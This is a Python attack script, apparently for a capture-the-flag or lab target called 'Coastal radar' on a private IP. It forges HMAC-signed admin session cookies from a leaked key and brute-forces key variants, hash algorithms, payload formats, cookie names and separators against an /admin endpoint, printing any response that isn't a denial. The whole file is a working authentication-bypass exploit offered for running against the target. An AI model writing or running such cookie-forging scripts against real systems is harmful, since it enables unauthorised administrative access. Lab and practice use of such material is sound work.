#!/usr/bin/env python3
# Forge an HMAC-signed admin session cookie for /admin on Coastal radar, using the
# leaked key (docs/protocol.txt: key "radar" padded with station 18 -> "radar18").
# YOU run this against the target. Prints any /admin response that is NOT "admin only"/"denied"/"no".
import hmac, hashlib, base64, urllib.request, re

BASE = "http://10.10.10.22:8448/admin"
keys  = ["radar18", "radar", "18radar", "radar-18", "radar_18"]
algos = {"sha256": hashlib.sha256, "sha1": hashlib.sha1, "md5": hashlib.md5}
names = ["session", "auth", "token", "user", "sid", "login"]
datas = ["admin", "user=admin", "username=admin", "role=admin", "admin=1", "name=admin"]
seps  = ["|", ":", ".", "~"]

def get(cookie):
    try:
        req = urllib.request.Request(BASE, headers={"Cookie": cookie})
        r = urllib.request.urlopen(req, timeout=5)
        return r.getcode(), r.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="replace")

def tail(b):
    m = re.search(r'RADAR CALIBRATION</p>(.*?)</div>', b, re.S)
    return (m.group(1) if m else b[:160]).strip()

seen=set()
def shoot(name, value, tag):
    code, body = get(f"{name}={value}")
    t = tail(body)
    if t not in ("admin only", "denied", "no") and t[:60] not in seen:
        seen.add(t[:60]); print(f"[{code}] {tag}  cookie={name}={value[:60]} -> {t[:220]!r}")

for k in keys:
    for an, h in algos.items():
        for data in datas:
            sig_hex = hmac.new(k.encode(), data.encode(), h).hexdigest()
            sig_b64 = base64.b64encode(hmac.new(k.encode(), data.encode(), h).digest()).decode()
            d_b64   = base64.b64encode(data.encode()).decode().rstrip("=")
            for name in names:
                for sep in seps:
                    shoot(name, f"{data}{sep}{sig_hex}", f"k={k} {an} data={data!r} hex")
                    shoot(name, f"{d_b64}{sep}{sig_hex}", f"k={k} {an} b64data|hex")
                    shoot(name, f"{data}{sep}{sig_b64}", f"k={k} {an} data|b64sig")
print("done. (only non-'admin only' responses shown)")
